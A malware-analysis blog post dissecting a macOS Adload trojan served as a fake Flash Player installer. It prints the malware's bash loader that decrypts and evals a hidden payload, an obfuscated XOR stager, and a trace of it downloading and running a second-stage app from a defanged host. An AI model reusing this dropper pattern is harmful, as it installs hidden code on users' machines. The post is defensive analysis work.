---
layout: post
title: Adload Sample, Part 1: Static Analysis
---
Happy New Year! Excuse my absense, while I have been away taking studying for GCFA and enjoying the holidays. Now that's all over I'm back to show you some static analysis of a macOS trojan I found today. Hope you enjoy and please send any questions, or comments to ragingroosterrem@gmail.com. Thanks!

### Tools Used:
- macOS High Sierra virtualized with Virtualbox
- Bash Commands: bash, cat, cd, clamscan, codesign, file, find, hdiutil, ls, md5, openssl, plutil, shasum
- VirusTotal

### The Story, YAFFD
I was googling a security tool called moloch + threat hunting and clicked on a link to what I thought was a security blog containing some juciy information. It was the third link, on the first page of results mind you! Instead of being served up some info to make my day better, I was redirected to Yet Another Fake Flash Downloader (YAFFD). Okay, I'd preffer to do some malware analysis anyway.

<img src="{{ site.baseurl }}/images/YAFFD.png">

### Analysis

#### After, I clicked the pretty button and downloaded the .dmg I fired up my shell and went to my downloads folder to see what gift I was given.
```
$ cd ~/Downloads

$ ls
AdobeFlashPlayerInstaller.dmg

$ file AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: zlib compressed data

$ md5 AdobeFlashPlayerInstaller.dmg 
MD5 (AdobeFlashPlayerInstaller.dmg) = 8c5a97b8234af7f41e03b4421904a8ff

$ shasum AdobeFlashPlayerInstaller.dmg 
b972667995d2ca1d205c3be4d57fc80814834970  AdobeFlashPlayerInstaller.dmg

$ codesign -dvvv AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: code object is not signed at all
```
_Hey! Wouldn't Adobe sign this?_

#### Let's tear into this .dmg like a bag of hot cheetos.
```
$ hdiutil attach AdobeFlashPlayerInstaller.dmg 
Checksumming Protective Master Boot Record (MBR : 0)…
Protective Master Boot Record (MBR :: verified   CRC32 $7510EE46
Checksumming GPT Header (Primary GPT Header : 1)…
 GPT Header (Primary GPT Header : 1): verified   CRC32 $366ED316
Checksumming GPT Partition Data (Primary GPT Table : 2)…
GPT Partition Data (Primary GPT Tabl: verified   CRC32 $70831B84
Checksumming  (Apple_Free : 3)…
                    (Apple_Free : 3): verified   CRC32 $00000000
Checksumming disk image (Apple_HFS : 4)…
..............................................................................
          disk image (Apple_HFS : 4): verified   CRC32 $B3A8FFCC
Checksumming  (Apple_Free : 5)…
                    (Apple_Free : 5): verified   CRC32 $00000000
Checksumming GPT Partition Data (Backup GPT Table : 6)…
GPT Partition Data (Backup GPT Table: verified   CRC32 $70831B84
Checksumming GPT Header (Backup GPT Header : 7)…
  GPT Header (Backup GPT Header : 7): verified   CRC32 $00709B9F
verified   CRC32 $7647ACE4
/dev/disk1          	GUID_partition_scheme          	
/dev/disk1s1        	Apple_HFS                      	/Volumes/Player

$ cd /Volumes/Player/

$ find .
.
./.5692438210.png
./.DS_Store
./Player_210.app
./Player_210.app/Contents
./Player_210.app/Contents/_CodeSignature
./Player_210.app/Contents/_CodeSignature/CodeDirectory
./Player_210.app/Contents/_CodeSignature/CodeRequirements
./Player_210.app/Contents/_CodeSignature/CodeRequirements-1
./Player_210.app/Contents/_CodeSignature/CodeResources
./Player_210.app/Contents/_CodeSignature/CodeSignature
./Player_210.app/Contents/Info.plist
./Player_210.app/Contents/MacOS
./Player_210.app/Contents/MacOS/Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg
./Player_210.app/Contents/Resources
./Player_210.app/Contents/Resources/210
./Player_210.app/Contents/Resources/app5692438210.icns
./Player_210.app/Contents/Resources/enc
```
_Looks similar to most other .dmg directory structures._

##### Let's take a look at the .dmg's Property List (plist) which stores some valuable app data.
```
$ cd /Volumes/Player/Player_210.app/

$ plutil -p Info.plist 
{
  "CFBundleExecutable" => "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleIconFile" => "app5692438210.icns"
  "CFBundleIdentifier" => "com.Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleInfoDictionaryVersion" => "6.0"
  "CFBundleName" => "PlayerInstaller"
  "CFBundlePackageType" => "APPL"
  "CFBundleShortVersionString" => "1.0"
  "CFBundleSupportedPlatforms" => [
    0 => "MacOSX"
  ]
  "CFBundleVersion" => "5692438210"
  "LSMinimumSystemVersion" => "10.9"
  "NSHumanReadableCopyright" => "Copyright © 2017 All rights reserved."
  "NSPrincipalClass" => "NSApplication"
}
```
_Looks like "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg" is the binary executed by the .dmg._

##### Let's inspect the binary.
```
$ cd MacOS/

$ ls
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg

$ file Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg: Bourne-Again shell script text executable, ASCII text
```
_Hey! That's a shell script, not a Macho... But, that's not too extraordinary._

##### Let's just see what it does.
```bash
$ cat Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
#!/bin/bash
cd "$(dirname "$BASH_SOURCE")"
fileDir="$(dirname "$(pwd -P)")"
eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:5692438210 <"$fileDir"/Resources/enc)"
```
_Okay, so this is interesting. The bash script uses openssl to decrypt whatever is in enc using base64 & AES 256._

#### Let's see what /Resources/enc is!
```
$ cd /Volumes/Player_210.app/Contents/Resources

$ file enc 
enc: ASCII text
```
_Yep. As expected._

#### Time to decrypt it. Thanks for giving me the command & password to do it!
```bash
$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:5692438210 < enc > ~/Desktop/decoded.sh

$ cd ~/Desktop

$ cat ~/Desktop/decoded.sh
#!/bin/bash
_l() {
    _i=0;
    _x=0;
    for ((_i=0; _i<${#1}; _i+=2)) do 
        __return_var="$__return_var$(printf "%02x" $(( ((0x${1:$_i:2})) ^ ((0x${2:$_x:2})) )) )"
        if (( (_x+=2)>=${#2} )); then ((_x=0)); fi
    done
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}

_m() {
    _v=$(base64 --decode <(printf "$1"));
    _k=$(xxd -pu <(printf "$2"));
    __return_var="$(xxd -r -p <(_l "$_v" "$_k"))"
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}
_y="5692438210"
_t="MTYxNzE2NTA1ZDVkMTc1MDUwNDM1ZDNjNWY0NzVhNTA0YzViNWU1ZTE1NTU1MTU3NTc1ODc1NTYwNDE4MWMxNjQyMzgxNDEzMTgxMjU0NDg1NjVhNGM1NjUxNTc3YzViNDM0MzA4MWUxZTFkNjI1YzU0NDc1YzU1NDYxOTY5NDA1MTUxNTc1ZDQ1MWYxMjE2MWUxZDYyNWM1NDQ3NWM1NTQ2MTk3NDUzNTc1YTU2NDY1ZTQzNWQxNjcxNzYxYjE0MTgxNTFlNjY1YTVhNGM1ZjUxNDAxNzYwNTQ1MzVhNDA1YzQwNGQxYzFmMWIzYjNhMTUxNjE5MTI1MjVjNGExMjQ3NWY1OTQzNTQ1NzcwNWE0YTEyNTg1ZTE1MTk2ZjVkNTg0NjU1NTc0MjFmMWYxOTMzMTIxNDEzMTg1NjVlM2ExNTE2MTkxMjE0MTMxODEyNDI1YjVjNDYwNDAyM2UxMzE4MTIxMTEwMTUxNjE5NTQ1YjQxMTg1NzQ5NTM1OTQzNWQ1NzUwNzc1MTQwMTE1OTViMTYxYjE2NGY1NjQwNTE1ZDQ1NTE1MzVkNzY1ZDQxNGI2OTcxNmQ0ODE0MzMxMjE0MTMxODEyMTExMDE1NTI1NjM4MTQxMzE4MTIxMTEwMTUxNjE5MTIxNDEzNTE1NDExNmI2ZTE2MWIxNjUxNGI1YjVlNDQ1NDUwNTI3ZDViNDYxMTE4MGYwYzEwMTcxMjRmNWQ1ODQ2NTU1Nzc1NTk0NzE0MTk2ZjY5MDgxODQ2NTk1NTViM2MxOTEyMTQxMzE4MTIxMTEwMTUxNjE5MTIxNDEzMTgxMjQyNWI1YzQ2MDQwMzNlMTMxODEyMTExMDE1MTYxOTEyMTQxMzE4MTIxMTEwMTU1NDRiNTc1NTU4MDMzODExMTAxNTE2MTkxMjE0MTMxODEyMTExMDUzNWYzMzEyMTQxMzE4MTIxMTEwMTU1MjU2NWM1MTM5MTgxMjExMTAxNTE2MTkxMjVkNTUxODY5MTExNDQ2NWQ1MDQyMTQwZTA1MTIwMDEwNjgwZDE5NDY1YzU2NTYzODExMTAxNTE2MTkxMjE0MTMxODEyMTExMDU2NTk1NzQ2NWQ1ZDRkNTcwYTNhMTUxNjE5MTIxNDEzMTgxMjU3NTkxNTNjMTkxMjE0MTMxODEyMTExMDNmMTYxOTEyMTQxMzE4MTIxMTQ2NWE1YTRjNWY1MTdlNWMwNzBjMTIxMTFlNWY1YjVhNTcxODEwMTU0NjVhNWE0YzVmNTE3NzUxNDAxZTE0MDQxOTFiMTIxOTQ3NDE0MjU0MTA1MzE2MTQ1NzRjNTY1YjEyNWM1NDAwMTYxNDQzMTQ0ODQ1MTI2ZDBiMTU0YTE5NWY1MDA2MTgxZjQwMTkxNzNjMTkxMjE0MTMxODEyMTExMDE2NTM1YTVhNWIxMzFhMTY0NzVmNTk0MzU0NTc3MDVhNGExMjVjNTQwMDBjMTkxNjQyNWM1NDQ3NWM1NTc4NTIwYzEwM2UzOTE4MTIxMTEwMTUxNjE5MTI1ZDU1MTg2OTExMTQwNzE2MDQwZjE0MTc0ZTVkNWQ0NTU4NTM3NDU2MDExMzY1MDkxMTQ0NWQ1MzU3MzgxNDEzMTgxMjExMTAxNTE2MTkxMjE0MTM1ZDUxNTk1ZjE1MTQxZDQ0NWI1ZjRkNWY1NDc0NWM0NDFiMDkzZTEzMTgxMjExMTAxNTE2MTkxMjE0MTMxODQwNTQ0NDQwNDQ1NzA5M2UxMzE4MTIxMTEwMTUxNjE5NTQ1ZDM5MTgxMjExMTA1MTU5NTc1NzNlNGUzMjUxNDQ0MjQ3NTM1NzQ2NzA1YTRhMGYxMzE0NjU2MTdkMTAzZTUyNDg0Mjc1NTk0NzBiMWIxNjFjNTc1MTQwNWY1MTU4NTMxOTE2MWM1NzUxNDA1ZjUxNTg1MzE5MTAxMDUwNGQ0MDQzNTU1YjQyN2Q1YjQ2MTExMTFiMTMzYTU0NDY0OTdjNTU1ZTVkMGYxMzE0MWQ1NDU4NDE1MTVkNTk1ZjU0MTAxNzEyNTg0MjQ0Nzc1MTQwMTMxOTE3M2M1YTQ3NDY0MTVkNWM0NTdkNTEwMzA0MTAxMDFiNWU1YjVmNTQxNTE0MWQ1MzQ0NDM3YzViNDMxMjE1MWI0ZDRiNDQ1NjE4NTQxMTFkNTA0ZTVjNTExNDVlNWMwNzExMWQ0NDE2NDI0ZjE0NmYwMzEyNGQxMDU4NTIwYzEyMTk0MjExMTAzYjQ2NWE1YTRjNWY1MTZjNTY1MzVjNTUwODE0MWQxYTU3NWI1ZDUxNWE3ZDUxMDMxOTEwMTA1MjQ4NDI3ZjUxNTg1MzFiMTIxNjE3NWI0NzQzNDI1MDU4NGQ3ZjUwMDYxYTFiMTMzYTVhNDU2NjQ0NTE0MTRiNWI1ZTVlMDgxNDFkMWE0NzQ0Njc0NDU0NDI0NjE2MTQ0MjQ2NWM1YzQ3NTI0NDYzNTM0YjQxNWQ1YzU2MWIxMzNhNDY1MzRhNDE1ZDVjNTY2ZDU2NDU1YzUyMDQxMDEwMWI0ZDQ3NTg1NDUyNTM1NzFiMTYzOTU1NTM1MjU4NWM1ODVjNmQ1ZDU3MDUxMDE1MTg1MDU1NTE1ZDE0MWU1NjEyMTMxNDFkNWY1NjQwNTE1NDE4MWY0MzU0MDQxNjE0NTExNDdhNzc2MjVkNTE0MTUwNTY0MDU5NzY0MDQyNTQ0MjQxNzI1YzQ0NWQ1MDVkMTI0ZDEwNTI0NDVjNDIxNDFlNTcxMjE2MTI3Yzc5Njk1ZTU1NDc1ZTVkNDM1ZDYwNjM3MDc2MTYxMzA1MTIxMzZjMWQxODEzNmUxZDExMWYxMjRkMTA0NjUzNWQxMjE5NzYxODFmNWYxMDEyNDU3OTFjMWUxMTEwNjk2ZjEyNjgxZDEwMTA3NDZmMDk3MjQxMTcxYzE0MTk0ZTE0NDc0YTEyMWM1NDU2MTYxZTY5NmYwOTQ4NDA1ODVlNDEwYzY0NmYxMzFhMWEzODQ0NDI1OTBiMWI1YTQwNDc0ODA4MWUxZjU0NDY1MDFjNTk1MjRiNDY1NDQyNTQ1ODU4NWU0ZDQwNWQ0MDFmNTM1YTViMTY0MTUwMWMwNzUxMGM2ZjQ1NWE2NjAwN2U0YTVhNjMwYzBkMTM0MzA0MTY1OTUyNWI1YTU4NWU1MDY5NTA1NjEyNDAwNTE2NDI1NTQ2NDU1MDVkNWE2YzVmNDc1ODU0MTM1OTA0MTY1YjQwNjc0NDU0NDI0NjVmNTY1YzEyNTEwNTA3MDcwOTA3MDIwYTBhMDYwMjA4MTAzYjQ1NWI0YzUwNDI2YjQzNTk0MTQyNDc1YTQ0NWQwZjE2MDMwOTAwMDkwMzAxMDQwMDA0MDEwYTBjMDEwNDA2MGMwNDBkMDEwYzAxMDkwMjEzM2E0MTViNDk2ZDQ0NTI0YzVhMGMxMjExMWU1NDU5NDA1NjU1NDIxMTFmNDE1YjQ5MWQ2YzZiNjA2YTY5Njg2ZDZlNjExYjE2Mzk1YjQ3NDM1YzE1MWI1ZjAyNzgxMzFhMTY0NDQyNTkxNDE5MGMxYjU3NWQ0NDFlNWU0MDVhNTUxMjA2MGQxZTAzMTEwZTBiMTI0ZDVmNDQ2YzQ4NTM0NTU4M2Y1NzQ5NDI2YjU3NTE0MDBjMTIxMTFlNTQ1OTQwNTY1NTQyMTExZDUxMTYxNjQ2NTk0MzE3NmE2OTY4NmQ2ZTYxNmE2YzFhMTcxMDNiNDU1YjRjNTA0MjE0MWU2ODEyMTMxNDQwNTg0MzViNDQ2YzQ4NTM0MjQzNDI1OTRiNTYxNjEzMWExNjQ1NWQ0NTY5NDk1MzQwNWIxYTEyMWM1NDE1MTQxZDUzNDQ0MzY3NTY1ODQyMTcxNjA3MTIxYjU3NWQ0NDFlNWU0MDVhNTUxMjA2MGQxZTAzM2I0MjU4MTYxNDU0MTQxNzRjNWY0MTZmNDU1NzRkNWEzZTU1NTE1ZTU0NmY1YjU3NTQ1NzA5MTExYzFhNTY0MjUwNDYxOTFmNTkwMjE4MWY0NzEwMTcxYzE3NTM0NDQzMWExMjBkMTg1OTQ1MTkxZjA1MTMxYTE2NTA0MDQ1Njk1ZDViNDYxMTExMWIxMzNhNDM1OTU1NDc1OTU2Njc1YzUwNWQ1MDBiMWIxNjRmNDU1NzVlNDQ1ZDUwNjk1NzUzNTk1NjE3MWQxMTFmMTAwNDA5NGYxNjM5NWI1YTVjNWY1MTE2MTI0YTE0MTExYzUzNDE0MDZhNTI1MDQwMTA1NTUxNWU1NDZmNWI1NzU0NTcxYjcwNTc1YzQ1NTU1YjQyNGExZDc5NTI1YjdkNjIxMjFhMWMzMzVkNDQ1NjU2MTIxYzUxMTUxNDFkNTM0NDQzNjc1NjU4NDIxMTUwNTA1ZTUxNmM1NjUzNWM1NTE3MTYxNDFmNTU0MTVmNDExMTEyNDYxNDE5MTAxMDQwNWQ0MTQyNTk1YTU4NjY1NTQxNWE1YzEwMTExMjExNDA1NjVlNDE1ZTVkNmQ1ZjUxNTg1MzFi"
eval "$(_m "$_t" "$_y")"
```
_Eek! I don't want to spend all day on those loops. These functions are likely used to call down another binary. "t" is defintely obfuscated, likely multiple times based on the xxd command._

#### Shortcut: Debug it with bash.
```
$ bash -x decoded.sh 2> debugged.txt
```
_This takes a minute. And executes the script! So that means... do it in a VM on your analysis system! When I executed it a "flash installer" wizard popped up at the end._
```
------TRUNCATED DUE TO LENGTH--------
++ url='http://api[.]masteranalyser[.]com/sd/?c=_pl_2JybQ==&u=95DF5053-0A0C-4E96-BA3C-143C4E0364F5&s=257AF0DD-4AE7-4324-B1FF-BA47F1DE654F&o=10.13.3&b=5692438210'
++ unzip_password=01283429659435692438210
+++ mktemp /tmp/XXXXXXXXX
++ tmp_path=/tmp/yWfcf6tRW
++ curl -f0L 'http://api[.]masteranalyser[.]com/sd/?c=_pl_2JybQ==&u=95DF5053-0A0C-4E96-BA3C-143C4E0364F5&s=257AF0DD-4AE7-4324-B1FF-BA47F1DE654F&o=10.13.3&b=5692438210'
+++ mktemp -d /tmp/XXXXXXXX
++ app_dir=/tmp/kMeQxavD/
++ unzip -P 01283429659435692438210 /tmp/yWfcf6tRW -d /tmp/kMeQxavD/
++ rm -f /tmp/yWfcf6tRW
+++ grep -m1 -v '*.app' /dev/fd/63
++++ ls -1 /tmp/kMeQxavD/
++ file_name=Player.app
++ volume_name=
++ chmod +x /tmp/kMeQxavD/Player.app/Contents/MacOS/5693093694
++ open -a /tmp/kMeQxavD/Player.app --args s 257AF0DD-4AE7-4324-B1FF-BA47F1DE654F ''
```
_There is a lot of output in the debug file, we may need to reference this later, but for now the important part is a file was downloaded from api[.]masteranalyser[.]com with my machine UID, placed in the tmp directory, and then executed. We can see now that the variable "y" in the "enc" file above was actually Player.app. "t" was likely used to enumerate the OS version and UUID of my machine which was used to form the URL. Note: I defanged the URLs in the output._

#### Okay, let's see what's in /tmp/kMeQxavD/Player.app:
```
$ cd /tmp/kMeQxavD/Player.app/

$ find .
.
./Contents
./Contents/_CodeSignature
./Contents/_CodeSignature/CodeResources
./Contents/Info.plist
./Contents/MacOS
./Contents/MacOS/5693093694
./Contents/Resources
./Contents/Resources/3694.icns
./Contents/Resources/Player.app
./Contents/Resources/Player.app/Contents
./Contents/Resources/Player.app/Contents/_CodeSignature
./Contents/Resources/Player.app/Contents/_CodeSignature/CodeResources
./Contents/Resources/Player.app/Contents/Info.plist
./Contents/Resources/Player.app/Contents/MacOS
./Contents/Resources/Player.app/Contents/MacOS/CAC4DD3330C6
./Contents/Resources/Player.app/Contents/Resources
./Contents/Resources/Player.app/Contents/Resources/app5693093694.icns
```
_Interesting there is a second /Contents/MacOS directory with CAC4DD3330C6 in it.. we'll come back to that later._

#### I want to know if the .app file is signed.
```
$ cd ..

$ codesign -dvvv Player.app/
Executable=/private/tmp/kMeQxavD/Player.app/Contents/MacOS/5693093694
Identifier=5693093694
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20200 size=1002 flags=0x0(none) hashes=26+3 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha1=8c7c87a8734f1a25e47065f39f4e7c6f05031a4b
CandidateCDHash sha256=07094dc7d4d61a8ece1f5f32ba41a393ca521391
Hash choices=sha1,sha256
CDHash=07094dc7d4d61a8ece1f5f32ba41a393ca521391
Signature size=9012
Authority=Developer ID Application: Hawkins Tristan (34C3U9CXLW)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=Jan 16, 2019 at 3:10:54 PM
Info.plist entries=10
TeamIdentifier=34C3U9CXLW
Sealed Resources version=2 rules=13 files=5
Internal requirements count=1 size=172
```
_Hey now would you look at that._

#### Let's figure out which binary the .app uses.
```
$ cd Player.app/Contents/

$ plutil -p Info.plist 
{
  "CFBundleExecutable" => "5693093694"
  "CFBundleIconFile" => "3694.icns"
  "CFBundleIdentifier" => "5693093694"
  "CFBundleInfoDictionaryVersion" => "6.0"
  "CFBundleName" => "Player"
  "CFBundlePackageType" => "APPL"
  "CFBundleShortVersionString" => "1.0"
  "CFBundleSupportedPlatforms" => [
    0 => "MacOSX"
  ]
  "CFBundleVersion" => "93694"
  "LSMinimumSystemVersion" => "10.9"
}
```
_Looks like its named "5693093694". Note: If I just wanted the CFBundleExecutable info I could run: plutil -p Info.plist | grep "CFBundleExecutable" to pull just that._

#### What is "5693093694", I wonder?
```
$ cd MacOS/

$ ls
5693093694

$ file 5693093694 
5693093694: Mach-O 64-bit executable x86_64

$ md5 5693093694 
MD5 (5693093694) = eafb2f45de3e6f6d5dee2a5e2148b8cf

$ shasum 5693093694 
b69c1075af2d307e0d12d61b7af05d4980827d5e  5693093694
```
_Ah, here we go. The hashes were not found on VT when I searched them today. So, I scanned with Clamscan._

#### Clamscan:
```
$ clamscan -ir 5693093694 

----------- SCAN SUMMARY -----------
Known viruses: 6770330
Engine version: 0.100.0
Scanned directories: 0
Scanned files: 1
Infected files: 0
Data scanned: 0.12 MB
Data read: 0.12 MB (ratio 1.00:1)
Time: 15.947 sec (0 m 15 s)
```
_Nothing found. So, I uploaded it to VT. Results were 3/56 when I first sumbitted the file: <https://www.virustotal.com/#/file/2b458e0ea39db0f51b7c94e1bf28560a35f1ed07461ef9b094360d183a69da18/detection>. Looks like the binary is Adload-M, a MacOS Trojan. Windows versions of Adload typically introduce backdoors on the system._

#### Back to the second Player.app and binary:
```
$ cd /tmp/kMeQxavD/Player.app/Contents/Resources/

$ codesign -dvvv Player.app/
Executable=/private/tmp/kMeQxavD/Player.app/Contents/Resources/Player.app/Contents/MacOS/CAC4DD3330C6
Identifier=com.CAC4DD3330C6
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20200 size=5936 flags=0x0(none) hashes=180+3 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha1=7fb94c5008a0a30147092a3c601d33a21406e23e
CandidateCDHash sha256=425854b6a9e2ae95f3fca138a81baaf591dc58f7
Hash choices=sha1,sha256
CDHash=425854b6a9e2ae95f3fca138a81baaf591dc58f7
Signature size=9012
Authority=Developer ID Application: Hawkins Tristan (34C3U9CXLW)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=Jan 16, 2019 at 3:10:54 PM
Info.plist entries=20
TeamIdentifier=34C3U9CXLW
Sealed Resources version=2 rules=13 files=1
Internal requirements count=1 size=176
```
_That's a slightly different result than the other Player.app. The Executable of this one is CAC4DD3330C6._

#### Plist says:
```
$ cd Player.app/Contents

$ ls
Info.plist	MacOS		Resources	_CodeSignature

$ plutil -p Info.plist 
{
  "BuildMachineOSBuild" => "16C67"
  "CFBundleDevelopmentRegion" => "en"
  "CFBundleExecutable" => "CAC4DD3330C6"
  "CFBundleIconFile" => "app5693093694.icns"
  "CFBundleIdentifier" => "com.CAC4DD3330C6"
  "CFBundleInfoDictionaryVersion" => "6.0"
  "CFBundleName" => "PlayerInstaller"
  "CFBundlePackageType" => "APPL"
  "CFBundleShortVersionString" => "1.0"
  "CFBundleSupportedPlatforms" => [
    0 => "MacOSX"
  ]
  "CFBundleVersion" => "5693093694"
  "DTCompiler" => "com.apple.compilers.llvm.clang.1_0"
  "DTPlatformBuild" => "8B62"
  "DTPlatformVersion" => "GM"
  "DTSDKBuild" => "16B2649"
  "DTSDKName" => "macosx10.12"
  "LSMinimumSystemVersion" => "10.9"
  "NSAppTransportSecurity" => {
    "NSAllowsArbitraryLoads" => 1
    "NSAllowsArbitraryLoadsInWebContent" => 1
  }
  "NSHumanReadableCopyright" => "Copyright © 2017 All rights reserved."
  "NSPrincipalClass" => "NSApplication"
  ```
 
 ####  "CAC4DD3330C6" the second Macho.
```
$ cd MacOS/

$ file CAC4DD3330C6 
CAC4DD3330C6: Mach-O 64-bit executable x86_64

$ md5 CAC4DD3330C6 
MD5 (CAC4DD3330C6) = aa07958f8a08b275c799a8975171ad76

$ shasum CAC4DD3330C6 
ed26d23f8fa527e036de118b6c4d182b6159f878  CAC4DD3330C6
```
_VT didn't detect these hashes either. But, ClamAV caught it :)_

#### Clamav:
```
$ cp CAC4DD3330C6 ~/Desktop/

$ cd ~/Desktop/

$ clamscan -ir CAC4DD3330C6 
CAC4DD3330C6: Osx.Trojan.Generic-6776032-0 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6770330
Engine version: 0.100.0
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.73 MB
Data read: 0.73 MB (ratio 1.01:1)
Time: 15.506 sec (0 m 15 s)
```
_I also uploaded this binary to VT. It was detected as Adload by 17/56 AV engines right away. Results:<Results: https://www.virustotal.com/#/file/a23c9488d26bf65b1b5209c042b8340304d295cdfc55f2f31cb89d3511f9634d/detection>_

